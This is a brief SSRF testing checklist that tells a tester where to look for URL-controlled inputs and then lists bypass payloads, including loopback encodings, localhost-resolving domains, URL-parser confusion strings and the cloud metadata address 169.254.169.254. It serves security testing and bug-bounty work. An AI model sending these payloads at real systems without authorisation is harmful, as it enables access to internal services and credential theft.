
1. Find locations where you control the url
	1. Examples: PDF generators, pulling image files down, or even just parameters that call to files
2. When found:
	1. Test DNS rebinding: https://danielmiessler.com/blog/dns-rebinding-explained
	2. Open redirects, reuse an open redirect found in the SSRF to reach to external domains
	3. Use common SSRF payloads, use http or https:
		```
		- http://127.0.0.1:80
		- http://0.0.0.0:80
		- http://localhost:80
		- http://[::]:80/
		- http://spoofed.burpcollaborator.net
		- http://localtest.me
		- http://customer1.app.localhost.my.company.127.0.0.1.nip.io
		- http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
		- http://bugbounty.dod.network redirect to 127.0.0.2 == localhost
		- http://127.127.127.127
		- http://2130706433/ = http://127.0.0.1
		- http://[0:0:0:0:0:ffff:127.0.0.1]
		- localhost:+11211aaa
		- http://0/
		- http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
		- http://127.1.1.1:80\@127.2.2.2:80/
		- http://127.1.1.1:80\@@127.2.2.2:80/
		- http://127.1.1.1:80:\@@127.2.2.2:80/
		- http://127.1.1.1:80#\@127.2.2.2:80/
		- http://169.254.169.254
		- 0://evil.com:80;http://google.com:80/
		```
3. More: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md


